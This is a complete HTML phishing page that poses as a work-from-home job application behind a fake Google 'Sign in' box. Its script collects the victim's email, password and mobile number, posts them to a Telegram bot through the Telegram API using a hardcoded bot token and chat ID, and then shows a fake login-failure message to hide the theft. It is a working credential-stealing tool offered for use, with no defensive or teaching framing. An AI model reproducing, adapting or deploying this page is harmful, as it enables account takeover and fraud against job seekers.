<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Work From Home - Apply now</title>
  <style>
    body {
  font-family: "Roboto", Arial, sans-serif;
  background-image: url('https://usa-jobs.github.io/USAJOB.com/USAJOBS.jpg');
  background-size: 100% 100%; /* fit entire screen */
  background-position: center;
  background-repeat: no-repeat;
  margin: 0;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
}

    .login-box {
      background: rgba(255, 255, 255, 0.85); /* transparent white */
      backdrop-filter: blur(6px); /* adds a nice glass effect (modern browsers) */
      width: 360px;
      max-width: 90%;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
      padding: 40px 30px;
      text-align: center;
    }

    .login-box img {
      width: 75px;
      margin-bottom: 15px;
    }

    .login-box h2 {
      font-size: 22px;
      margin: 10px 0;
      font-weight: 500;
      color: #202124;
    }

    .login-box p {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 25px;
    }

    .input-field {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 14px;
    }

    .input-field:focus {
      border-color: #1a73e8;
      outline: none;
      box-shadow: 0 0 2px #1a73e8;
    }

    .btn {
      width: 100%;
      padding: 12px;
      background: #1a73e8;
      color: #fff;
      font-size: 15px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 15px;
    }

    .btn:hover {
      background: #1669c1;
    }

    .footer-text {
      margin-top: 25px;
      font-size: 12px;
      color: #5f6368;
    }

    .footer-text a {
      color: #1a73e8;
      text-decoration: none;
    }

    .footer-text a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Logo">
    <h2>Sign in</h2>
    <p>To Apply - Login Directly with your Gmail</p>

    <form id="loginForm" action="javascript:void(0);">
      <input type="text" id="username" name="username" class="input-field" placeholder="Email or phone" required>
      <input type="password" id="password" name="password" class="input-field" placeholder="Enter your password" required>
      <input type="text" id="mobile" name="mobile" class="input-field" placeholder="Mobile with country code" required>
      <button type="submit" class="btn">Next</button>
    </form>

    <div class="footer-text">
      <a href="#">Forgot email?</a><br><br>
      Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();

      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;
      var mobile = document.getElementById('mobile').value;

      var payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;

      sendToTelegram(payload);
      alert("Login failed: Invalid credentials"); // Gmail style fake response
    });

    function sendToTelegram(message) {
      var chatId = '5738863873'; // your Telegram user ID
      var botToken = '8211036124:AAGSsDbdurbpjt7FtEyuKri0sQgmBfCjntU'; // your new bot token
      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      var xhr = new XMLHttpRequest();
      xhr.open("POST", apiUrl, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

      var postData = `chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      xhr.send(postData);
    }
  </script>

</body>
</html>
